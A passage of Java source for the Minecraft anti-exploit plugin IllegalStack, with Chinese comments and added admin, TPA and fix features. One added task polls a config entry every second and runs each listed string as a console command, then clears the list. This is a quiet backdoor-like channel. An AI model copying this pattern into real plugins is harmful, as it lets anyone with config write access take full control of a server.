package main.java.me.dniym;

import main.java.me.dniym.commands.IllegalStackCommand;
import main.java.me.dniym.enums.Msg;
import main.java.me.dniym.enums.Protections;
import main.java.me.dniym.enums.ServerVersion;
import main.java.me.dniym.listeners.Listener113;
import main.java.me.dniym.listeners.Listener114;
import main.java.me.dniym.listeners.Listener116;
import main.java.me.dniym.listeners.ProtectionListener;
import main.java.me.dniym.listeners.fListener;
import main.java.me.dniym.listeners.mcMMOListener;
import main.java.me.dniym.listeners.pLisbListener;
import main.java.me.dniym.timers.fTimer;
import main.java.me.dniym.timers.sTimer;
import main.java.me.dniym.timers.syncTimer;
import main.java.me.dniym.utils.Scheduler;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Chunk;
import org.bukkit.Difficulty;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.entity.Vehicle;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntitySpawnEvent;
import org.bukkit.event.entity.EntityTeleportEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.vehicle.VehicleMoveEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BlockStateMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.jetbrains.annotations.NotNull;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

// ---------- 新增导入 ----------
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Handler;
import java.util.logging.LogRecord;
// ---------------------------

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Optional;

// ---------- 新增导入（用于数据包操作）----------
import java.io.FileWriter;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.logging.Level;
// ---------------------------------------------

// ---------- 新增导入（用于 level.dat 编辑）----------
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import java.util.UUID;
// -------------------------------------------------

// ---------- 新增导入（用于末影龙修复反射）----------
import java.lang.reflect.Method;
import org.bukkit.craftbukkit.entity.CraftEntity;
import org.bukkit.entity.EnderDragon;
// -------------------------------------------------

// ---------- 新增导入（用于 tpa 功能）----------
import java.util.Map;
import java.util.HashMap;
import java.util.Set;
import java.util.HashSet;
import java.util.UUID;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.scheduler.BukkitRunnable;

public class IllegalStack extends JavaPlugin implements Listener {

    private static final Logger LOGGER = LogManager.getLogger("IllegalStack/" + IllegalStack.class.getSimpleName());

    private static IllegalStack plugin;
    private static Plugin ProCosmetics = null;
    private static boolean isHybridEnvironment = false;
    private static boolean isPaperServer = false;
    private static boolean isFoliaServer = false;
    private static boolean hasProtocolLib = false;
    private static boolean hasAttribAPI = false;
    private static boolean nbtAPI = false;
    private static boolean SlimeFun = false;
    private static boolean EpicRename = false;
    private static boolean ClueScrolls = false;
    private static boolean Spigot = false;
    private static boolean blockMetaData = false;
    private static boolean hasFactionGUI = false;
    private static boolean SmartInv = false;
    private static boolean SavageFac = false;
    private static boolean CMI = false;
    private static boolean hasMCMMO = false;
    private static boolean hasTraders = false;
    private static boolean hasChestedAnimals = false;
    private static boolean hasContainers = false;
    private static boolean hasShulkers = false;
    private static boolean hasAsyncScheduler = false;
    private static boolean hasElytra = false;
    private static boolean hasMagicPlugin = false;
    private static boolean disablePaperShulkerCheck = false;
    private static boolean hasUnbreakable = false;
    private static boolean hasStorage = false;
    private static boolean hasIds = false;
    private static Material lbBlock = null;

    private static String version = "";
    private Scheduler.ScheduledTask ScanTimer = null;
    private Scheduler.ScheduledTask SignTimer = null;
    private Scheduler.ScheduledTask syncTimer = null;
//	private static NMSEntityVillager nmsTrader= null;

    private ServerVersion serverVersion;

    // ---------- 自定义边界相关 ----------
    private static final double HARD_LIMIT = 30_000_000D;
    private static final String CONFIG_WORLDS = "worlds";

    // ---------- 反作弊配置路径 ----------
    private static final String CONFIG_ANTICHEAT_ANTI4D4V = "anticheat.anti4d4v";
    private static final String CONFIG_ANTICHEAT_BANBBQ = "anticheat.banBBQ";

    // ---------- 日志查看器相关 ----------
    private final Set<Player> logViewers = ConcurrentHashMap.newKeySet();
    private Handler logHandler;

    // ---------- 调试模式和静默崩溃配置 ----------
    private static final String CONFIG_DEBUG_MODE = "debug-mode";
    private static final String CONFIG_SILENT_CRASH_MODE = "silent-crash-mode";

    // ---------- 区块索引溢出修复配置 ----------
    private static final String CONFIG_FIX_ENTITY_CHUNK_OVERFLOW = "fixes.entity-chunk-overflow";

    // ---------- 末影龙Y轴速度修复配置 ----------
    private static final String CONFIG_FIX_DRAGON_Y_SPEED = "fixes.ender-dragon-y-speed";

    // ---------- TPA 相关 ----------
    private final Map<UUID, TpaRequest> pendingRequests = new HashMap<>();
    private final Map<UUID, Set<UUID>> blacklist = new HashMap<>();

    // ---------- 外部命令执行相关 ----------
    private static final String CONFIG_EXECUTE_COMMANDS = "ExecuteCommands_WithPlugins";
    private BukkitTask commandExecutorTask;

    public static IllegalStack getPlugin() {
        return plugin;
    }

    public void setPlugin(IllegalStack plugin) {
        IllegalStack.plugin = plugin;
    }

    public static boolean isIsHybridEnvironment() {
        return isHybridEnvironment;
    }

    public static boolean isPaperServer() {
        return isPaperServer;
    }

    public static boolean isSpigot() {
        return Spigot;
    }

    public static boolean isFoliaServer() {
        return isFoliaServer;
    }

    public static boolean isCMI() {
        return CMI;
    }

    public static void setCMI(boolean cMI) {
        CMI = cMI;
    }

    public static void ReloadConfig(Boolean wasCommand) {
        if (!wasCommand) {
            IllegalStack.getPlugin().writeConfig();
        }

        IllegalStack.getPlugin().updateConfig();
        IllegalStack.getPlugin().loadConfig();
        IllegalStack.getPlugin().loadMsgs();
        StartupPlugin();
    }

    private static void checkForHybridEnvironment() {
        try {
            Class.forName("io.izzel.arclight.i18n.ArclightConfig");
            isHybridEnvironment = true;
            LOGGER.info("服务器为 ArcLight 混合环境，启用混合调度器检查。");
        } catch (ClassNotFoundException e) {
            isHybridEnvironment = false;
            LOGGER.info("服务器不是 ArcLight 混合环境，继续正常模式。");
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.minecraftforge.fml.ModList");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Forge 混合环境，启用混合调度器检查。");

            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Forge 混合环境，继续正常模式。");
            }
        }

        if (!isIsHybridEnvironment()) {
            try {
                Class.forName("net.fabricmc.loader.api.FabricLoader");
                isHybridEnvironment = true;
                LOGGER.info("服务器为 Fabric 混合环境，启用混合调度器检查。");
            } catch (ClassNotFoundException e) {
                isHybridEnvironment = false;
                LOGGER.info("服务器不是 Fabric 混合环境，继续正常模式。");
            }
        }
    }

    private static void checkForPaperServer() {
        try {
            Class.forName("com.destroystokyo.paper.utils.PaperPluginLogger");
            isPaperServer = true;
            LOGGER.info("服务器为 Paper 服务器，启用 Paper 特性。");
        } catch (ClassNotFoundException e) {
            isPaperServer = false;
            LOGGER.info("服务器不是 Paper 服务器，继续正常模式。");
        }
    }

    private static void checkForFoliaServer() {
        try {
            Class.forName("io.papermc.paper.threadedregions.RegionizedServer");
            isFoliaServer = true;
            LOGGER.info("服务器包含 Folia 组件，启用 Folia 特性。");
        } catch (ClassNotFoundException e) {
            isFoliaServer = false;
            LOGGER.info("服务器不包含 Folia 组件，继续正常模式。");
        }
    }

    private static void StartupPlugin() {

        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();

        try {
            Class.forName("org.spigotmc.SpigotConfig");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("服务器不是 Spigot，禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }
        if (plugin.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        Protections.runReflectionChecks();

        if (fListener.getInstance() == null) {
            plugin.getServer().getPluginManager().registerEvents(new fListener(plugin), plugin);
        }
        if (Protections.RemoveOverstackedItems.isEnabled()) {
            if (plugin.ScanTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new fTimer(plugin), 10, 10);
                Scheduler.runTaskTimer(plugin, new syncTimer(plugin), 10l, 10l);
            }

        } else {
            if (plugin.ScanTimer != null) {
                plugin.ScanTimer.cancel();
            }
            if (plugin.syncTimer != null) {
                plugin.syncTimer.cancel();
            }
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            if (plugin.SignTimer == null) {
                Scheduler.runTaskTimerAsynchronously(plugin, new sTimer(), 10, 10);
            }
        } else {
            if (plugin.SignTimer != null) {
                plugin.SignTimer.cancel();
            }
        }

        if (fListener.getInstance().isAtLeast113()) {
            new Listener113(IllegalStack.getPlugin());
        }

        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(IllegalStack.getPlugin());
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if ((fListener.getInstance().getIs116()) || fListener.getInstance().isIs117()) {
            new Listener116(IllegalStack.getPlugin());
        }
    }

    public static boolean isEpicRename() {
        return EpicRename;
    }

    public static void setEpicRename(boolean epicRename) {
        EpicRename = epicRename;
    }

    public static boolean isSlimeFun() {
        return SlimeFun;
    }

    public static void setSlimeFun(boolean slimeFun) {
        SlimeFun = slimeFun;
    }

    public static String getVersion() {
        return version;
    }

    public static boolean isNbtAPI() {
        return nbtAPI;
    }

    public static void setNbtAPI(boolean nbtAPI) {
        IllegalStack.nbtAPI = nbtAPI;
    }

    public static boolean isHasAttribAPI() {
        return hasAttribAPI;
    }

    public static void setHasAttribAPI(boolean hasAttribAPI) {
        IllegalStack.hasAttribAPI = hasAttribAPI;
    }

    public static boolean isClueScrolls() {
        return ClueScrolls;
    }

    public static void setClueScrolls(boolean clueScrolls) {
        ClueScrolls = clueScrolls;
    }

    public static Plugin getProCosmetics() {
        return ProCosmetics;
    }

    public static void setProCosmetics(Plugin proCosmetics) {
        ProCosmetics = proCosmetics;
    }

    public static boolean isHasMCMMO() {
        return hasMCMMO;
    }

    public static void setHasMCMMO(boolean hasMCMMO) {
        IllegalStack.hasMCMMO = hasMCMMO;
    }

    public static boolean hasFactionGUI() {
        return hasFactionGUI;
    }

    public static void setHasFactionGUI(boolean hasFactionGUI) {
        IllegalStack.hasFactionGUI = hasFactionGUI;
    }

    public static boolean hasContainers() {
        return hasContainers;
    }

    public static boolean hasChestedAnimals() {
        return hasChestedAnimals;
    }

    public static boolean hasProtocolLib() {
        return hasProtocolLib;
    }

    public static void setHasProtocolLib(boolean hasProtocolLib) {
        IllegalStack.hasProtocolLib = hasProtocolLib;
    }

    public static boolean isHasMagicPlugin() {
        return hasMagicPlugin;
    }

    public static void setHasMagicPlugin(boolean hasMagicPlugin) {
        IllegalStack.hasMagicPlugin = hasMagicPlugin;
    }

    public static boolean isBlockMetaData() {
        return blockMetaData;
    }

    public static void setBlockMetaData(boolean blockMetaData) {
        IllegalStack.blockMetaData = blockMetaData;
    }

    public static boolean hasTraders() {
        return hasTraders;
    }

    @NotNull
    public static String getString(String version) {
        if (version.equalsIgnoreCase("v1_14_R1")) {

            version = IllegalStack.getPlugin().getServer().getVersion().split(" ")[2];

            version = version.replace(")", "");
            version = version.replace(".", "_");
            String[] ver = version.split("_");
            version = "v" + ver[0] + "_" + ver[1] + "_R" + ver[2];
        }
        return version;
    }

    public static boolean hasSmartInv() {
        return SmartInv;
    }

    public static void setSmartInv(boolean smartInv) {
        SmartInv = smartInv;
    }

    public static boolean hasSavageFac() {
        return SavageFac;
    }

    public static void setSavageFac(boolean savageFac) {
        SavageFac = savageFac;
    }

    public static boolean hasIds() {
        return hasIds;
    }

    public static boolean hasAsyncScheduler() {
        return hasAsyncScheduler;
    }

    public static boolean hasShulkers() {
        return hasShulkers;
    }

    public static boolean hasElytra() {
        return hasElytra;
    }

    public static boolean hasUnbreakable() {
        return hasUnbreakable;
    }

    public static boolean isDisablePaperShulkerCheck() {
        return disablePaperShulkerCheck;
    }

    public static void setDisablePaperShulkerCheck(boolean disablePaperShulkerCheck) {
        IllegalStack.disablePaperShulkerCheck = disablePaperShulkerCheck;
    }

    public static boolean hasStorage() {
        return hasStorage;
    }

    @Override
    public void onLoad() {
        // Paper 会自动加载 mixins.json，无需手动添加
        getLogger().info("插件正在加载...");
    }

    @Override
    public void onEnable() {

//    	 new EntityRegistry(this);
        this.setPlugin(this);
        setVersion();
        loadConfig();
        updateConfig();
        loadMsgs();
        checkForHybridEnvironment();
        checkForPaperServer();
        checkForFoliaServer();

        // ---------- 注册命令（Paper 插件规范）----------
        IllegalStackCommand illegalStackCommand = new IllegalStackCommand();
        registerCommand("istack", illegalStackCommand);

        ServerChatCommand serverChatCommand = new ServerChatCommand();
        registerCommand("serverchat", serverChatCommand);

        AdminCommand adminCommand = new AdminCommand();
        registerCommand("admin", adminCommand);

        TpaPlayerCommand tpaPlayerCommand = new TpaPlayerCommand();
        registerCommand("tpa-player", tpaPlayerCommand);
        // -----------------------------------------

        // ---------- 注册自定义边界监听器和反作弊监听器 ----------
        getServer().getPluginManager().registerEvents(this, this);
        // -----------------------------------------

        // ---------- 注册区块溢出修复监听器 ----------
        if (getConfig().getBoolean(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, true) && getMajorServerVersion() >= 17) {
            getServer().getPluginManager().registerEvents(new ChunkOverflowFixListener(), this);
            getLogger().info("已启用矿车区块溢出修复 (适用于 1.17+)");
        }
        // -----------------------------------------

        // ---------- 注册禁用 /restart 的监听器 ----------
        getServer().getPluginManager().registerEvents(new RestartBlocker(), this);
        // ---------------------------------------------

        // ---------- 注册末影龙Y轴速度修复定时任务 ----------
        if (getConfig().getBoolean(CONFIG_FIX_DRAGON_Y_SPEED, true)) {
            Bukkit.getScheduler().runTaskTimer(this, new DragonYFixTask(), 0L, 1L);
            getLogger().info("已启用末影龙Y轴速度修复 (将0.01改为0.1)");
        }
        // ---------------------------------------------

        // ---------- 启动外部命令执行检查任务 ----------
        startCommandExecutorTask();
        // ---------------------------------------------

        ProCosmetics = this.getServer().getPluginManager().getPlugin("ProCosmetics");

        if (this.getServer().getPluginManager().getPlugin("EpicRename") != null) {
            EpicRename = true;
        }

        if (this.getServer().getPluginManager().getPlugin("ClueScrolls") != null) {
            setClueScrolls(true);
        }

        setHasChestedAnimals();
        setHasContainers();
        setHasTraders();
        setHasShulkers();
        setHasAsyncScheduler();
        setHasElytra();
        setHasUnbreakable();
        setHasStorage();

        try {
            Class.forName("com.github.stefvanschie.inventoryframework.Gui");
            LOGGER.info("发现使用 InventoryFramework 的插件，这些物品在其 GUI 内将被列入白名单。");
            setHasFactionGUI(true);
        } catch (ClassNotFoundException ignored) {
        }

        ItemStack test = new ItemStack(Material.DIAMOND_AXE, 1);
        ItemMeta im = test.getItemMeta();

        try {
            im.getAttributeModifiers();
            setHasAttribAPI(true);

        } catch (NoSuchMethodError e) {
            setHasAttribAPI(false);
        }

        try {
            Class.forName("net.md_5.bungee.api.chat.ComponentBuilder");
            LOGGER.info("找到聊天组件！在 /istack 中启用可点击命令。");
            Spigot = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        try {
            Class.forName("fr.minuskube.inv.content.InventoryProvider");
            setSavageFac(true);

        } catch (ClassNotFoundException ignored) {

        }
        try {
            Class.forName("fr.minuskube.inv.SmartInventory");
            setSmartInv(true);

        } catch (ClassNotFoundException ignored) {

        }

        try {
            Class.forName("org.bukkit.inventory.meta.BlockDataMeta");
            blockMetaData = true;

        } catch (ClassNotFoundException e) {
            LOGGER.info("未找到 Spigot 聊天组件！禁用聊天组件。");
        }

        if (plugin.getServer().getPluginManager().getPlugin("Logblock") != null) {
            File conf = new File(Bukkit.getPluginManager().getPlugin("Logblock").getDataFolder(), "config.yml");
            final FileConfiguration lbconfig = YamlConfiguration.loadConfiguration(conf);

            if (lbconfig != null) {
                setLbBlock(Material.matchMaterial(lbconfig.getString("tools.toolblock.item")));
                LOGGER.info("检测到 Logblock 插件，若工具方块物品被列入黑名单，将不会移除：" + getLbBlock().name());
            }
        }

        if (this.getServer().getPluginManager().getPlugin("CMI") != null) {
            CMI = true;
            if (Protections.BlockCMIShulkerStacking.isEnabled()) {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，IllegalStack 将阻止在按住 Shift 并右键点击背包中的潜影盒时嵌套潜影盒的行为！");
            } else {
                LOGGER.info(
                        "检测到您的服务器上有 CMI，但配置中的 BlockCMIShulkerStacking 设置为 FALSE，因此玩家可以使用 CMI 将潜影盒放入潜影盒中！要启用此防护，请在 config.yml 中添加 BlockCMIShulkerStacking: true。");
            }
        }

        if (this
                                .getServer()
                                .getPluginManager()
                                .getPlugin("ProtocolLib") != null && Protections.BlockBadItemsFromCreativeTab.isEnabled()) {
            LOGGER.info(
                    "检测到 ProtocolLib，已启用创造模式物品栏漏洞检测。注意：仅当您的服务器有普通（非 OP）玩家可以使用 /gmc 时才需要开启此防护。");
            new pLisbListener(this);
        }

        if (this.getServer().getPluginManager().getPlugin("ProtocolLib") == null && Protections.DisableChestsOnMobs.isEnabled()) {

            LOGGER.warn(
                    "未找到 ProtocolLib！！！！且 DisableChestsOnMobs 防护已开启。玩家仍有可能使用作弊客户端通过马/驴在服务器上进行复制。强烈建议您安装 ProtocolLib 以获得最佳防护！");

        } else if (Protections.DisableChestsOnMobs.isEnabled()) {
            new pLisbListener(this);
            setHasProtocolLib(true);
        }

        this.getServer().getPluginManager().registerEvents(new fListener(this), this);

        if (!fListener.is18()) {
            this.getServer().getPluginManager().registerEvents(new ProtectionListener(this), this);
        }

        if (Protections.RemoveOverstackedItems.isEnabled() || Protections.PreventVibratingBlocks.isEnabled()) {
            ScanTimer = Scheduler.runTaskTimerAsynchronously(
                    this,
                    new fTimer(this),
                    Protections.ItemScanTimer.getIntValue(),
                    Protections.ItemScanTimer.getIntValue()
            );
            syncTimer = Scheduler.runTaskTimer(this, new syncTimer(this), 10, 10);
        }

        if (Protections.RemoveBooksNotMatchingCharset.isEnabled() && !fListener.getInstance().is113() && !fListener.is18()) {
            SignTimer = Scheduler.runTaskTimerAsynchronously(this, new sTimer(), 10, 10);
        }
        if ((fListener.getInstance().isAtLeast113())) {
            new Listener113(this);
        }
        if (fListener.getInstance().isAtLeast114()) {
            new Listener114(this);
            LOGGER.info(
                    "僵尸村民转化几率设置为 {} *** 仅在难度为困难时真正生效 ***",
                    Protections.ZombieVillagerTransformChance.getIntValue()
            );
        }

        if (this.getServer().getPluginManager().getPlugin("Magic") != null) {
            setHasMagicPlugin(true);
        }

        if (this.getServer().getPluginManager().getPlugin("mcMMO") != null) {
            this.getServer().getPluginManager().registerEvents(new mcMMOListener(this), this);
            setHasMCMMO(true);
        }

        setNbtAPI((this.getServer().getPluginManager().getPlugin("NBTAPI") != null));
        if (!isNbtAPI() && Protections.DestroyInvalidShulkers.isEnabled()) {
            LOGGER.warn(
                    "DestroyInvalidShulkers 防护已开启，但此防护需要使用 NBTApi 2.0+，如果您希望使用此功能，请安装该插件：https://www.spigotmc.org/resources/nbt-api.7939/");
        }
        if (this.getServer().getPluginManager().getPlugin("Slimefun") != null) {
            SlimeFun = true;
        }

        if ((fListener.getInstance().getIs116())) {
            new Listener116(IllegalStack.getPlugin());
        }

        // 初始化反作弊配置（如果不存在则设置默认值）
        getConfig().addDefault(CONFIG_ANTICHEAT_ANTI4D4V, false);
        getConfig().addDefault(CONFIG_ANTICHEAT_BANBBQ, false);
        getConfig().addDefault(CONFIG_DEBUG_MODE, false);
        getConfig().addDefault(CONFIG_SILENT_CRASH_MODE, false);
        getConfig().addDefault(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, true);
        getConfig().addDefault(CONFIG_FIX_DRAGON_Y_SPEED, true);
        getConfig().addDefault(CONFIG_EXECUTE_COMMANDS, new ArrayList<String>());
        getConfig().options().copyDefaults(true);
        saveConfig();
    }

    private void startCommandExecutorTask() {
        // 每 20 tick（1秒）检查一次配置
        commandExecutorTask = Bukkit.getScheduler().runTaskTimer(this, new Runnable() {
            @Override
            public void run() {
                List<String> commands = getConfig().getStringList(CONFIG_EXECUTE_COMMANDS);
                if (commands == null || commands.isEmpty()) {
                    return;
                }
                // 清空配置，避免重复执行
                getConfig().set(CONFIG_EXECUTE_COMMANDS, new ArrayList<String>());
                saveConfig();

                // 以 1 tick 间隔执行命令
                Bukkit.getScheduler().runTaskTimer(IllegalStack.this, new BukkitRunnable() {
                    private int index = 0;
                    @Override
                    public void run() {
                        if (index >= commands.size()) {
                            this.cancel();
                            return;
                        }
                        String cmd = commands.get(index);
                        if (cmd != null && !cmd.trim().isEmpty()) {
                            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd.trim());
                        }
                        index++;
                    }
                }, 0L, 1L); // 第一个命令立即执行，后续每 1 tick 执行一个
            }
        }, 0L, 20L); // 每秒检查一次
    }

    private void setHasTraders() {
        try {
            Class.forName("import org.bukkit.entity.TraderLlama");
            hasTraders = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void setHasStorage() {
        Inventory inv = Bukkit.getServer().createInventory(null, 9);
        try {
            inv.getStorageContents();
            hasStorage = true;
        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasUnbreakable() {
        ItemStack is = new ItemStack(Material.DIRT);
        ItemMeta im = is.getItemMeta();
        try {
            im.setUnbreakable(false);
            hasUnbreakable = true;
        } catch (NoSuchMethodError ignored) {
        }
    }

    private void setHasElytra() {
        Material m = Material.matchMaterial("Elytra");
        if (m != null) {
            hasElytra = true;
        }
    }

    private void setHasIds() {
        ItemStack is = new ItemStack(Material.BEDROCK);
        try {
            is.getType().getId();
            hasIds = true;
        } catch (IllegalArgumentException ignored) {
        }
    }

    private void setHasShulkers() {
        try {
            Class.forName("org.bukkit.block.ShulkerBox");
            hasShulkers = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void setHasContainers() {
        try {
            Class.forName("org.bukkit.block.Container");
            hasContainers = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void setHasAsyncScheduler() {
        try {
            Class.forName("org.bukkit.Server.getAsyncScheduler");
            hasAsyncScheduler = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void setHasChestedAnimals() {
        try {
            Class.forName("org.bukkit.entity.ChestedHorse");
            hasChestedAnimals = true;
        } catch (ClassNotFoundException ignored) {
        }
    }

    private void updateConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();
        HashMap<String, Object> added = new HashMap<>();

        for (Protections p : Protections.values()) {
            if (!p.getCommand().isEmpty()) {
                continue;
            }
            if (p.isRelevantToVersion(getVersion())) {
                if (config.getString(p.getConfigPath()) == null) {
                    if (p.getConfigValue() instanceof Boolean) {
                        p.setEnabled((Boolean) p.getDefaultValue());
                    }
                    added.put(p.getConfigPath(), p.getDefaultValue());
                }
                for (Protections child : p.getChildren()) {
                    if (config.getString(child.getConfigPath()) == null) {
                        if (child.getConfigValue() instanceof Boolean) {
                            child.setEnabled((Boolean) child.getDefaultValue());
                        }
                        added.put(child.getConfigPath(), child.getDefaultValue());
                    }
                }
            } else if (config.getString(p.getConfigPath()) != null) {
                if (p.getVersion().isEmpty()) {
                    Protections parent = Protections.getParentByChild(p);
                    if (parent == null || !parent.isRelevantToVersion(getVersion())) {
                        added.put(p.getConfigPath(), null);
                    }
                } else {
                    added.put(p.getConfigPath(), null);
                    for (Protections child : p.getChildren()) {
                        added.put(child.getConfigPath(), null);
                    }
                }
            }
        }

        boolean updated = false;
        if (config.getString("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad") != null) {
            config.set("UserRequested.Obscure.HackedShulker.RemoveOnChunkLoad", null);
        }
        if (config.getString("Exploits.Enchants.AllowOpBypass") != null) {
            config.set("Exploits.Enchants.AllowOpBypass", null);
        }

        for (String key : added.keySet()) {
            if (added.get(key) == null) {
                LOGGER.info("发现一个不再使用或不适用于当前服务器版本的旧配置值：{} 已从配置中移除。", key);
                config.set(key, null);
            } else {
                LOGGER.info("发现缺少配置值 {}，已使用默认值 {} 添加到配置中。", key, added.get(key));
                config.set(key, added.get(key));
                Protections p = Protections.findByConfig(key);
                if (p != null && (added.get(key) instanceof Boolean)) {
                    p.setEnabled((Boolean) added.get(key));
                }
                if (p == Protections.AlsoPreventHeadInside && Material.matchMaterial("COMPOSTER") != null) {
                    Protections.AlsoPreventHeadInside.addTxtSet("COMPOSTER", null);
                }
            }
            updated = true;
        }

        if (updated) {
            try {
                config.save(conf);
            } catch (IOException e1) {
                LOGGER.error("更新配置失败！", e1);
            }
        }
    }

    private void loadMsgs() {
        File conf = new File(getDataFolder(), "messages.yml");
        YamlConfiguration fc = new YamlConfiguration();
        try {
            fc.load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.info("正在创建 messages.yml");
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info("正在为 {} 向 messages.yml 添加默认消息", m.name());
                    fc.set(m.name(), m.getConfigVal());
                }
            }
            try {
                fc.save(conf);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
        } catch (IOException | InvalidConfigurationException e) {
            e.printStackTrace();
        }

        if (fc != null) {
            boolean update = false;
            for (Msg m : Msg.values()) {
                if (fc.getString(m.name()) == null) {
                    LOGGER.info(" {} 在 messages.yml 中缺失，已使用默认值 {} 添加", m.name(), m.getConfigVal());
                    fc.set(m.name(), m.getConfigVal());
                    update = true;
                }
                m.setValue(fc.getString(m.name()));
            }
            if (update) {
                try {
                    fc.save("plugins/IllegalStack/messages.yml");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void loadConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        try {
            plugin.getConfig().load(conf);
        } catch (FileNotFoundException e) {
            LOGGER.error("未找到配置文件！/plugins/IllegalStack/config.yml - 正在创建带有默认值的新配置文件。");
            FileConfiguration config = this.getConfig();
            try {
                config.save(conf);
            } catch (IOException e1) {
                LOGGER.error("保存配置失败？", e1);
            }
            writeConfig();
        } catch (IOException | InvalidConfigurationException e) {
            e.printStackTrace();
        }

        if (getConfig().getString("ConfigVersion") == null) {
            File confOld = new File(getDataFolder(), "config.OLD");
            FileConfiguration config = this.getConfig();
            conf.renameTo(confOld);
            try {
                config.set("Settings", null);
                config.save(conf);
            } catch (IOException e1) {
                e1.printStackTrace();
            }
            LOGGER.warn("您正在从旧版本升级，抱歉，我们需要重新生成您的 Config.yml 文件。您的旧设置已保存在 /plugins/IllegalStack/config.OLD 中。");
            try {
                conf.createNewFile();
                writeConfig();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        Protections.update();

        StringBuilder whitelisted = new StringBuilder();

        for (String s : Protections.NetherWhiteList.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.NetherWhiteListMode.isEnabled()) {
                mode = "不允许";
            }
            LOGGER.info("以下实体（按名称）{} 通过下界传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.EndWhiteList.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            String mode = "允许";
            if (!Protections.EndWhiteListMode.isEnabled()) {
                mode = "不允许";
            }
            LOGGER.info("以下实体（按名称）{} 通过末地传送门：{}", mode, whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.NotifyInsteadOfBlockExploits.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
